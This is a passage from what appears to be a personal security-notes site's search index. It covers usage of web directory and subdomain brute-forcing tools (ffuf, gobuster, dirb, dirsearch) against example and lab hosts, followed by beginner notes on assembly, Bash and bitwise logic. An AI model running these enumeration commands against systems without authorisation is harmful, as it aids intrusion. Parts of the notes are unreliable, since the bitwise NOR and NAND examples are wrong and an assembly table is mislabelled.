multiple times. Implies -ac\n  -c                  Colorize output. (default: false)\n  -config             Load configuration from a file\n  -json               JSON output, printing newline-delimited JSON records    (default: false)\n  -maxtime            Maximum running time in seconds for entire process.     (default: 0)\n  -maxtime-job        Maximum running time in seconds per job. (default: 0)\n  -noninteractive     Disable the interactive console functionality (default:     false)\n  -p                  Seconds of `delay` between requests, or a range of    random delay. For example \"0.1\" or \"0.1-2.0\"\n  -rate               Rate of requests per second (default: 0)\n  -s                  Do not print additional information (silent mode)     (default: false)\n  -sa                 Stop on all error cases. Implies -sf and -se. (default:     false)\n  -scraperfile        Custom scraper file path\n  -scrapers           Active scraper groups (default: all)\n  -se                 Stop on spurious errors (default: false)\n  -search             Search for a FFUFHASH payload from ffuf history\n  -sf                 Stop when &gt; 95% of responses return 403 Forbidden     (default: false)\n  -t                  Number of concurrent threads. (default: 40)\n  -v                  Verbose output, printing full URL and redirect location     (if any) with the results. (default: false)\nMATCHER OPTIONS:\n  -mc                 Match HTTP status codes, or \"all\" for everything.     (default: 200-299,301,302,307,401,403,405,500)\n  -ml                 Match amount of lines in response\n  -mmode              Matcher set operator. Either of: and, or (default: or)\n  -mr                 Match regexp\n  -ms                 Match HTTP response size\n  -mt                 Match how many milliseconds to the first response byte,     either greater or less than. EG: &gt;100 or &lt;100\n  -mw                 Match amount of words in response\nFILTER OPTIONS:\n  -fc                 Filter HTTP status codes from response. Comma separated     list of codes and ranges\n  -fl                 Filter by amount of lines in response. Comma separated    list of line counts and ranges\n  -fmode              Filter set operator. Either of: and, or (default: or)\n  -fr                 Filter regexp\n  -fs                 Filter HTTP response size. Comma separated list of    sizes and ranges\n  -ft                 Filter by number of milliseconds to the first response    byte, either greater or less than. EG: &gt;100 or &lt;100\n  -fw                 Filter by amount of words in response. Comma separated    list of word counts and ranges\nINPUT OPTIONS:\n  -D                  DirSearch wordlist compatibility mode. Used in    conjunction with -e flag. (default: false)\n  -e                  Comma separated list of extensions. Extends FUZZ    keyword.\n  -enc                Encoders for keywords, eg. 'FUZZ:urlencode b64encode'\n  -ic                 Ignore wordlist comments (default: false)\n  -input-cmd          Command producing the input. --input-num is required    when using this input method. Overrides -w.\n  -input-num          Number of inputs to test. Used in conjunction with    --input-cmd. (default: 100)\n  -input-shell        Shell to be used for running command\n  -mode               Multi-wordlist operation mode. Available modes:     clusterbomb, pitchfork, sniper (default: clusterbomb)\n  -request            File containing the raw http request\n  -request-proto      Protocol to use along with raw request (default: https)\n  -w                  Wordlist file path and (optional) keyword separated by    colon. eg. '/path/to/wordlist:KEYWORD'\nOUTPUT OPTIONS:\n  -debug-log          Write all of the internal logging to the specified file.\n  -o                  Write output to file\n  -od                 Directory path to store matched results to.\n  -of                 Output file format. Available formats: json, ejson,     html, md, csv, ecsv (or, 'all' for all formats) (default: json)\n  -or                 Don't create the output file if we don't have results     (default: false)\nEXAMPLE USAGE:\n  Fuzz file paths from wordlist.txt, match all responses but filter out those     with content-size 42.\n  Colored, verbose output.\n    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v\n  Fuzz Host-header, match HTTP 200 responses.\n    ffuf -w hosts.txt -u https://example.org/ -H \"Host: FUZZ\" -mc 200\n  Fuzz POST JSON data. Match all responses not containing text \"error\".\n    ffuf -w entries.txt -u https://example.org/ -X POST -H \"Content-Type:     application/json\" \\\n      -d '{\"name\": \"FUZZ\", \"anotherkey\": \"anothervalue\"}' -fr \"error\"\n  Fuzz multiple locations. Match only responses reflecting the value of \"VAL\"     keyword. Colored.\n    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?   PARAM=VAL -mr \"VAL\" -c\n  More information and examples: https://github.com/ffuf/ffuf\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/gobuster/","title":"gobuster","text":"<p>gobuster</p> <p>Used to brute-force: - URIs (directories and files) in web sites. - DNS subdomains (with wildcard support). - Virtual Host names on target web servers. - Open Amazon S3 buckets - Open Google Cloud buckets - TFTP servers</p> <pre><code>#dir Mode - the classic directory brute-forcing mode\ngobuster dir -u https://example.com -w ~/wordlists/shortlist.txt\n\n#With content length - the classic directory brute-forcing mode\ngobuster dir -u https://example.com -w ~/wordlists/shortlist.txt -l\n\n----------------------------------------------------------------------------------------\n#dns Mode - DNS subdomain brute-forcing mode\ngobuster dns -d example.com -t 50 -w common-names.txt\ngobuster dns -d example.com-w ~/wordlists/subdomains.txt\n\n#With Show IP - DNS subdomain brute-forcing mode\ngobuster dns -d example.com -w ~/wordlists/subdomains.txt -i\n\n#Base domain validation warning when the base domain fails to resolve\ngobuster dns -d example.com -w ~/wordlists/subdomains.txt -i\n\n#Wildcard DNS is also detected properly:\ngobuster dns -d 0.0.1.xip.io -w ~/wordlists/subdomains.txt\n\n\n-h, --help  help for dns\n-d, --domain string The target domain\n-r, --resolver string   Use custom DNS server (format server.com or server.com:port)\n-c, --show-cname    Show CNAME records (cannot be used with '-i' option)\n-i, --show-ips  Show IP addresses\n--timeout duration  DNS resolver timeout (default 1s)\n\n\n----------------------------------------------------------------------------------------\n#vhost Mode - Virtual host brute-forcing mode (not the same as DNS!)\ngobuster vhost -u https://example.com -w common-vhosts.txt\n\n\n-h  --help  help for vhost\n-c  --cookies string    Cookies to use for the requests\n-r  --follow-redirect   Follow redirects\n-H  --headers stringArray   Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'\n-k  --no-tls-validation Skip TLS certificate verification\n-P  --password string   Password for Basic Auth\n-p  --proxy string  Proxy to use for requests [http(s)://host:port]\n--timeout duration  HTTP Timeout (default 10s)\n-u  --url string    The target URL\n-a  --useragent string  Set the User-Agent string (default \"gobuster/3.1.0\")\n-U  --username string   Username for Basic Auth\n-h  --help  help for vhost\n-c  --cookies string    Cookies to use for the requests\n-r  --follow-redirect   Follow redirects\n-H  --headers stringArray   Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'\n-k  --no-tls-validation Skip TLS certificate verification\n-P  --password string   Password for Basic Auth\n-p  --proxy string  Proxy to use for requests [http(s)://host:port]\n--timeout duration  HTTP Timeout (default 10s)\n-u  --url string    The target URL\n-a  --useragent string  Set the User-Agent string (default \"gobuster/3.1.0\")\n-U  --username string   Username for Basic Auth\n\n\n----------------------------------------------------------------------------------------\n#s3 Mode - Enumerate open S3 buckets and look for existence and bucket listings\ngobuster s3 -w bucket-names.txt\n\n#global flags\n-z  --no-progress   Don't display progress\n-o  --output string Output file to write results to (defaults to stdout)\n-q  --quiet Don't print the banner and other noise\n-t  --threads int   Number of concurrent threads (default 10)\n-i  --show-ips  Show IP addresses\n--delay duration    DNS resolver timeout (default 1s)\n-v, --verbose   Verbose output (errors)\n-w  --wordlist string   Path to the wordlist \n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/Async-DirBuster/","title":"Async-DirBuster","text":"<p>Source: Async-DirBuster</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/Async-DirBuster/#requirements","title":"Requirements","text":"<pre><code>pip install aiohttp beautifulsoup4 termcolor\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/Async-DirBuster/#usage","title":"Usage","text":"<p>Basic usage</p> <pre><code>python directory_buster.py -u &lt;target_url&gt; -w &lt;path_to_wordlist&gt;\n</code></pre> <p>Custom Header</p> <pre><code>python directory_buster.py -u https://example.com -w wordlist.txt -H 'Authorization: Bearer token'\n</code></pre> <p>Extensions</p> <pre><code>python directory_buster.py -u https://example.com -w wordlist.txt -x php asp\n</code></pre> <p>Saving results to the file</p> <pre><code>python directory_buster.py -u https://example.com -w wordlist.txt -o output.txt\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/Async-DirBuster/#supported-flags","title":"Supported flags","text":"Flag Description -x Specify a list of file extensions to append to the directories in the wordlist (e.g., x php asp) -r Follow redirects. If this flag is set, the script will follow HTTP redirects (3xx tatus codes) -H Specify custom HTTP headers in the format 'Header1: value1' 'Header2: value2' -a  Set a custom User-Agent string. The default is directorybuster/1.0 -ht Hide response title in output -m c  Include status codes to match, separated by space (e.g., -m c 200 04) -ms  Match response sizes, separated by space -fc  Filter status codes, separated by space (default is filtering 404) -fs  Filter response sizes, separated by space -o  Path to the output file to save the result"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/Async-DirBuster/#note","title":"Note","text":"<ul> <li>Matching and Filtering Response Length together is not available at the moment. Choose one of them in the command-line arguments.</li> <li>Matching and Filtering Response Status Code together is not available at the moment. Choose one of them in the command-line arguments.</li> </ul>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/Dictionaries/","title":"Dictionaries","text":"<p>Dictionaries</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirb/","title":"dirb","text":"<p>dirb</p> <p>no wordlists needed to specify, tool chooses for you</p> <pre><code>dirb http://192.168.1.106/dvwa/\n\n#search for extension file type\ndirb http://192.168.1.106/dvwa/ -X .php\n\n#output to file\ndirb http://192.168.1.106/dvwa/ -o output.txt\n\n#ignore return code 302\ndirb http://192.168.1.106/dvwa/ -N 302\n\n#do in  depth scan and don't avoid warning messages\ndirb http://192.168.1.106/ -w\n\n#speed delay in ms\ndirb http://192.168.1.106/dvwa -z \u00a0100\n\n#don't recusive scan\ndirb http://192.168.1.106/dvwa -r\n\n#find none existant pages such as error code pages\ndirb http://192.168.1.106/dvwa -v\n\n#extension list and header\ndirb http://192.168.1.106/dvwa -H .php\n\n#Http Autherization username:password\ndirb http://testphp.vulnweb.com/login.php -u \u00a0username:password\n\n#Proxy URL such as page Access Forbiden, it exists behind some proxy\ndirb http://192.168.1.108 \u2013p 192.168.1.108:3129\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirbuster/","title":"dirbuster","text":"<p>```shell</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirbuster/#install","title":"Install","text":"<p>sudo apt install gobuster</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirbuster/#search-for-director-after-the-know_directory","title":"Search for director after the know_directory/????","text":"<p>gobuster dir -u http://10.10.123.65/know_directory/ -w /usr/share/irbuster/wordlists/directory-list-2.3-medium.txt   ```</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/","title":"dirsearch","text":"<p>dirsearch github</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/#download-install","title":"Download &amp; Install","text":"<pre><code>git clone https://github.com/maurosoria/dirsearch.git --depth 1\n\n#pip install with PyPi\npip3 install dirsearch\nor\npip install dirsearch\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/#commands","title":"Commands","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/#simple-usage","title":"simple usage","text":"<pre><code>python3 dirsearch.py -u https://target\npython3 dirsearch.py -e php,html,js -u https://target\npython3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/#pausing-progress","title":"Pausing Progress","text":"<p>pause the scanning progress with CTRL+C, from here, you can save the progress (and continue later), skip the current target, or skip the current sub-directory.</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/#recursion","title":"Recursion","text":"<p>Recursive brute-force is brute-forcing continuously the after of found directories. For example, if dirsearch finds admin/, it will brute-force admin/ ( is where it brute forces). To enable this feature, use -r (or --recursive) flag</p> <pre><code>python3 dirsearch.py -e php,html,js -u https://target -r\n</code></pre> <p>You can set the max recursion depth with --max-recursion-depth, and status codes to recurse with --recursion-status</p> <pre><code>python3 dirsearch.py -e php,html,js -u https://target -r --max-recursion-depth 3 --recursion-status 200-399\n</code></pre> <p>If there are sub-directories that you do not want to brute-force recursively, use --exclude-subdirs</p> <pre><code>python3 dirsearch.py -e php,html,js -u https://target -r --exclude-subdirs image/,media/,css/\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/File_and_Directory_Enumeration/dirsearch/#options-switches","title":"Options | Switches","text":"<pre><code>Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]\n\nOptions:\n  --version             show program's version number and exit\n  -h, --help            show this help message and exit\n\n  Mandatory:\n    -u URL, --url=URL   Target URL(s), can use multiple flags\n    -l PATH, --url-file=PATH\n                        URL list file\n    --stdin             Read URL(s) from STDIN\n    --cidr=CIDR         Target CIDR\n    --raw=PATH          Load raw HTTP request from file (use '--scheme' flag\n                        to set the scheme)\n    -s SESSION_FILE, --session=SESSION_FILE\n                        Session file\n    --config=PATH       Path to configuration file (Default:\n                        'DIRSEARCH_CONFIG' environment variable, otherwise\n                        'config.ini')\n\n  Dictionary Settings:\n    -w WORDLISTS, --wordlists=WORDLISTS\n                        Customize wordlists (separated by commas)\n    -e EXTENSIONS, --extensions=EXTENSIONS\n                        Extension list separated by commas (e.g. php,asp)\n    -f, --force-extensions\n                        Add extensions to the end of every wordlist entry. By\n                        default dirsearch only replaces the %EXT% keyword with\n                        extensions\n    -O, --overwrite-extensions\n                        Overwrite other extensions in the wordlist with your\n                        extensions (selected via `-e`)\n    --exclude-extensions=EXTENSIONS\n                        Exclude extension list separated by commas (e.g.\n                        asp,jsp)\n    --remove-extensions\n                        Remove extensions in all paths (e.g. admin.php -&gt;\n                        admin)\n    --prefixes=PREFIXES\n                        Add custom prefixes to all wordlist entries (separated\n                        by commas)\n    --suffixes=SUFFIXES\n                        Add custom suffixes to all wordlist entries, ignore\n                        directories (separated by commas)\n    -U, --uppercase     Uppercase wordlist\n    -L, --lowercase     Lowercase wordlist\n    -C, --capital       Capital wordlist\n\n  General Settings:\n    -t THREADS, --threads=THREADS\n                        Number of threads\n    -r, --recursive     Brute-force recursively\n    --deep-recursive    Perform recursive scan on every directory depth (e.g.\n                        api/users -&gt; api/)\n    --force-recursive   Do recursive brute-force for every found path, not\n                        only directories\n    -R DEPTH, --max-recursion-depth=DEPTH\n                        Maximum recursion depth\n    --recursion-status=CODES\n                        Valid status codes to perform recursive scan, support\n                        ranges (separated by commas)\n    --subdirs=SUBDIRS   Scan sub-directories of the given URL[s] (separated by\n                        commas)\n    --exclude-subdirs=SUBDIRS\n                        Exclude the following subdirectories during recursive\n                        scan (separated by commas)\n    -i CODES, --include-status=CODES\n                        Include status codes, separated by commas, support\n                        ranges (e.g. 200,300-399)\n    -x CODES, --exclude-status=CODES\n                        Exclude status codes, separated by commas, support\n                        ranges (e.g. 301,500-599)\n    --exclude-sizes=SIZES\n                        Exclude responses by sizes, separated by commas (e.g.\n                        0B,4KB)\n    --exclude-text=TEXTS\n                        Exclude responses by text, can use multiple flags\n    --exclude-regex=REGEX\n                        Exclude responses by regular expression\n    --exclude-redirect=STRING\n                        Exclude responses if this regex (or text) matches\n                        redirect URL (e.g. '/index.html')\n    --exclude-response=PATH\n                        Exclude responses similar to response of this page,\n                        path as input (e.g. 404.html)\n    --skip-on-status=CODES\n                        Skip target whenever hit one of these status codes,\n                        separated by commas, support ranges\n    --min-response-size=LENGTH\n                        Minimum response length\n    --max-response-size=LENGTH\n                        Maximum response length\n    --max-time=SECONDS  Maximum runtime for the scan\n    --exit-on-error     Exit whenever an error occurs\n\n  Request Settings:\n    -m METHOD, --http-method=METHOD\n                        HTTP method (default: GET)\n    -d DATA, --data=DATA\n                        HTTP request data\n    --data-file=PATH    File contains HTTP request data\n    -H HEADERS, --header=HEADERS\n                        HTTP request header, can use multiple flags\n    --header-file=PATH  File contains HTTP request headers\n    -F, --follow-redirects\n                        Follow HTTP redirects\n    --random-agent      Choose a random User-Agent for each request\n    --auth=CREDENTIAL   Authentication credential (e.g. user:password or\n                        bearer token)\n    --auth-type=TYPE    Authentication type (basic, digest, bearer, ntlm, jwt,\n                        oauth2)\n    --cert-file=PATH    File contains client-side certificate\n    --key-file=PATH     File contains client-side certificate private key\n                        (unencrypted)\n    --user-agent=USER_AGENT\n    --cookie=COOKIE\n\n  Connection Settings:\n    --timeout=TIMEOUT   Connection timeout\n    --delay=DELAY       Delay between requests\n    --proxy=PROXY       Proxy URL (HTTP/SOCKS), can use multiple flags\n    --proxy-file=PATH   File contains proxy servers\n    --proxy-auth=CREDENTIAL\n                        Proxy authentication credential\n    --replay-proxy=PROXY\n                        Proxy to replay with found paths\n    --tor               Use Tor network as proxy\n    --scheme=SCHEME     Scheme for raw request or if there is no scheme in the\n                        URL (Default: auto-detect)\n    --max-rate=RATE     Max requests per second\n    --retries=RETRIES   Number of retries for failed requests\n    --ip=IP             Server IP address\n    --interface=NETWORK_INTERFACE\n                        Network interface to use\n\n  Advanced Settings:\n    --crawl             Crawl for new paths in responses\n\n  View Settings:\n    --full-url          Full URLs in the output (enabled automatically in\n                        quiet mode)\n    --redirects-history\n                        Show redirects history\n    --no-color          No colored output\n    -q, --quiet-mode    Quiet mode\n\n  Output Settings:\n    -o PATH, --output=PATH\n                        Output file\n    --format=FORMAT     Report format (Available: simple, plain, json, xml,\n                        md, csv, html, sqlite)\n    --log=PATH          Log file\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/User_Enumeration_%26_Content_Discovery/Authentication_Bypass_and_User_enumeration/","title":"Authentication Bypass and User enumeration","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Ansible/","title":"Ansible","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Ansible/#resource","title":"Resource","text":"<ul> <li>ansible basic cheat sheet</li> <li>ansible playbooks</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Ansible/#cheat-sheet","title":"Cheat sheet","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/","title":"Assembly","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#summary","title":"Summary","text":"<p>Assembly language depends on the CPU Architecture. An assembler translates mnemonics (e.g. jump, mov, add, etc.) from an assembly language into machine instructions. Machine instructions are entirely dependent on the hardware (they represent the hardware/CPU instruction set). The assembler implementation may (and generally is) OS-specific, because of the output program it produces (a Unix executable is not the same as a Windows executable, even though the underlying machine instruction set is x86, for example).</p> <p>Hierarchy of Programming Languages </p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#resources","title":"Resources","text":"<ul> <li>x86 Cheat sheet</li> <li>32-bit Cheat sheet</li> <li>wikipedia Comparison of assemblers</li> <li>wikipedia - Assembly language</li> <li>seattlewebsitedevelopers - Assembly Language</li> <li>YT - javidx9</li> <li>gpfault - x86-64 Assembly</li> <li>tutorialspoint - NASM Assembly Programming Tutorial</li> <li>Arm Assembly Language</li> <li>virginia edu - x86 Assembly Guide</li> <li>Intel's architecture manuals</li> <li>Intel\u00ae 64 and IA-32 Architectures Software Developer Manuals</li> <li>wikibooks - x86 Assembly</li> <li>Jonathan Bartlett - Programming from the Ground Up</li> <li>NASM Assembly Language Tutorials - asmtutor</li> <li>Webster</li> <li>AMD CS107 Guide to x86-64</li> <li>Brown.edu x64 cheatsheet</li> </ul>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#view-disassembly-code-in-the-visual-studio-debugger-c-c-visual-basic-f","title":"View disassembly code in the Visual Studio debugger (C#, C++, Visual Basic, F#)","text":"<p>Source: Microsoft</p> <p>To enable the Disassembly window, under Tools &gt; Options &gt; Debugging, select Enable address-level debugging To open the Disassembly window during debugging, select Windows &gt; Disassembly or press Alt+8</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#info-cheatsheets","title":"Info &amp; Cheatsheets","text":"<p>Intel x86 Assembly Language Cheat Sheet</p> <p></p> <p>X86/WIN32 REVERSE ENGINEERING CHEAT\u00adSHEET</p> <p>x64 Cheat Sheet</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#instructions-quick-overview","title":"Instructions quick overview","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#jump-instructions","title":"Jump Instructions","text":"Instruction Description Condition Code sete / setz D Set if equal/zero ZF setne / setnz D Set if not equal/nonzero ~ZF sets D Set if negative SF setns D Set if nonnegative ~SF setg / setnle D Set if greater (signed) ~(SF^0F)&amp;~ZF setge / setnl D Set if greater or equal (signed) ~(SF^0F) setl / setnge D Set if less (signed) SF^0F setle / setng D Set if less or equal (SF^OF) seta / setnbe D Set if above (unsigned) ~CF&amp;~ZF setae / setnb D Set if above or equal (unsigned) ~CF setb / setnae D Set if below (unsigned) CF setbe / setna D Set if below or equal (unsigned) CF/ZF"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#jump-instructions_1","title":"Jump Instructions","text":"Instruction Description Condition Code jmp Label Jump to label jmp *Operand Jump to specified location je / jz Label Jump if equal/zero ZF jne / jnz Label Jump if not equal/nonzero ~ZF js Label Jump if negative SF jns Label Jump if nonnegative ~SF jg / jnle Label Jump if greater (signed) ~(SF^0F)&amp;~ZF jge / jnl Label Jump if greater or equal (signed) ~(SF^0F) jl / jnge Label Jump if less (signed) SF^0F jle / jng Label Jump if less or equal (SF^OF) ja / jnbe Label Jump if above (unsigned) ~CF&amp;~ZF jae / jnb Label Jump if above or equal (unsigned) ~CF jb / jnae Label Jump if below (unsigned) CF jbe / jna Label Jump if below or equal (unsigned) CF"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#conditional-move-instructions","title":"Conditional Move Instructions","text":"<p>Conditional move instructions do not have any suffixes, but their source and destination operands must have the same size.</p> Instruction Description Condition Code cmove / cmovz S, D Move if equal/zero ZF cmovne / cmovnz S, D Move if not equal/nonzero ~ZF cmovs S, D Move if negative SF cmovns S, D Move if nonnegative ~SF cmovg / cmovnle S, D Move if greater (signed) ~(SF^0F)&amp;~ZF cmovge / cmovnl S, D Move if greater or equal (signed) ~(SF^0F) cmovl / cmovnge S, D Move if less (signed) SF^0F cmovle / cmovng S, D Move if less or equal (SF^OF) cmova / cmovnbe S, D Move if above (unsigned) ~CF&amp;~ZF cmovae / cmovnb S, D Move if above or equal (unsigned) ~CF cmovb / cmovnae S, D Move if below (unsigned) CF cmovbe / cmovna S, D Move if below or equal (unsigned) CF"},{"location":"Knowledge_Base/Coding_%26_Scripting/Assembly/#procedure-call-instruction","title":"Procedure Call Instruction","text":"<p>Procedure call instructions do not have any suffixes.</p> Instruction Description Condition Code call Label Push return address and jump to label call *Operand Push return address and jump to specified location leave Set %rsp to %rbp, then pop top of stack into %rbp ret Pop return address from stack and jump there"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/","title":"Bash","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#for-loops","title":"For-loops","text":"<pre><code>#!/bin/bash\n\nfor ((i = 0; i &lt; 10; i++)); do\n    echo $i\ndone\n</code></pre> <p>Another way to write this is by using the program <code>seq</code>. Seq is pretty much like <code>range()</code> in python. So it can be used like this:</p> <pre><code>#!/bin/bash\n\nfor x in `seq 1 100`; do\n    echo $x\ndone\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#if-statement","title":"If statement","text":"<p><code>$1</code> here represent the first argument.</p> <pre><code>if [ \"$1\" == \"\" ]; then\n    echo \"This happens\"\nfi\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#ifelse","title":"If/Else","text":"<pre><code>#!/bin/bash\n\nif [ \"$1\" == \"\" ]; then\n    echo \"This happens\"\nelse\n    echo \"Something else happens\"\nfi\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#command-line-arguments","title":"Command line arguments","text":"<p>Command line arguments are represented like this</p> <pre><code>#!/bin/bash\n\n$1\n</code></pre> <p>This is the first command line argument</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#daemonize-an-execution","title":"Daemonize an execution","text":"<p>If you do a ping-sweep with host the command will take about a second to complete. And if you run that against 255 hosts I will take a long time to complete. To avoid this we can just deamonize every execution to make it faster. We use the <code>&amp;</code> to daemonize it.</p> <pre><code>#!/bin/bash\n\nfor ip in $(cat ips.txt); do\n    ping -c 1 $ip &amp;\ndone\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#use-the-output-of-command","title":"Use the output of command","text":"<p>It has happened to me several times that I want to input the output of a command into a new command, for example:</p> <p>I search for a file, find three, and take the last line, which is a path. Now I want to cat that path:</p> <pre><code>#!/bin/bash\n\nlocate 646.c | tail -n 1\n</code></pre> <p>This can be done like this:</p> <pre><code>#!/bin/bash\n\ncat $(locate 646.c | tail -n 1)\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#iterate-over-a-file","title":"Iterate over a file","text":"<p>This script will iterate over a file and echo out every single line</p> <pre><code>#!/bin/bash\n\nfor line in $(cat file.txt);do\n    echo $line\ndone\n</code></pre> <p>Another way of writing is this</p> <pre><code>#!/bin/bash\n\nwhile read p; do\n    echo  $p\ndone &lt;file.txt\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#picoctf-flag-save","title":"picoCTF flag save","text":"<pre><code>#Create script with below\n#File save.sh and chmod +x\n#!/bin/bash\noriginal_directory=$(pwd)\ncd ..\nmv $original_directory ${original_directory}_COMPLETED\n\n#run as follows\nsource script.sh\n\n#save flag script\n#!/bin/bash\nwinning_command=$(history | tail -n 1 | cut -b 8-)\n\n#Create a new script within this script to pass the value of winning_command\n#EOF &gt; End of file\ncat &lt;&lt;EOF&gt;./get_flag.sh\n#!/bin/bash\n${winning_command}\nEOF\n\nchmod +x get_flag.sh\nget_flag.sh &gt; flag.txt\n\nRunning the above must be done after obtaining the flag\nrun the command .\\run | grep -oE \"picoCTF{.*}\" --color=none\nRun only the save.sh\nNow that would have created a get_flag.sh and a flag.txt\nyou can cat the txt file for the flag\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bash/#resources","title":"Resources","text":"<p>How to Create and Run Bash Shell Script [Beginner's Guide]</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/","title":"Bitwise Operation","text":"<p>Example Binary numbers</p> <pre><code>3    = 000011\n5    = 000101\n10   = 001010\n</code></pre> <p>Online Base Convertor</p>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#bitwise-and","title":"Bitwise AND","text":"<p>Take two numbers, line them up on top of each other, and create a new number that has a 1 where both numbers have a 1 (everything else is 0).</p> <pre><code>  3          =&gt;  00011\n&amp; 5          =&gt;  00101\n----           -------\n1                00001\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#bitwise-or","title":"Bitwise OR","text":"<p>Take two numbers, line them up on top of each other, and create a new number that has a 1 where either number has a 1 (everything else is 0).</p> <pre><code>  3          =&gt;  00011\n| 5          =&gt;  00101\n----           -------\n7                00111\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#bitwise-nor-not-or","title":"Bitwise NOR (Not OR)","text":"<p>Take the Bitwise OR of two numbers, and then reverse everything (where there was a 0, there's now a 1, where there was a 1, there's now a 0)</p> <pre><code># simplified gate view ^(3|5)\n\n^\n( 3           =&gt;  00011\n| 5)          =&gt;  00101\n----           -------\n6                 11000 \n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#bitwise-xor-exclusive-or","title":"Bitwise XOR (exclusive OR)","text":"<p>Take two numbers, line them up on top of each other, and create a new number that has a 1 where either number has a 1 AND the other number has a 0 (everything else is 0).</p> <pre><code>  3          =&gt;  00011\n^ 5          =&gt;  00101\n----           -------\n6                00110 \n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#bitwise-nand-not-and","title":"Bitwise NAND (Not AND)","text":"<p>Take the Bitwise AND of two numbers, and then reverse everything (where there was a 0, there's now a 1, where there was a 1, there's now a 0).</p> <pre><code>    n          =&gt;  abcdefghjikl\n&amp;   15         =&gt;  000000001111\n------            --------------\n    ?              00000000jikl\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#bitshift-operator","title":"Bitshift Operator","text":"<p>means \"shift everything left n bits\" or \"shift everything right n bits\"</p> <pre><code>1 &lt;&lt; 3 = 0001 &lt;&lt; 3 = 0001000 = 8\n\nAnd:\n\n8 &gt;&gt; 2 = 01000 &gt;&gt; 2 = 010 = 2\n</code></pre>"},{"location":"Knowledge_Base/Coding_%26_Scripting/Bitwise_Operation/#truth-table-for-all-binary-logical-operators","title":"Truth table for all binary logical operators","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/","title":"C#","text":""},{"location":"Knowledge_Base/Coding_%26_Scripting/C%23/#visual-studio-windows-forms-embed-resources","title":"Visual Studio - Windows Forms Embed 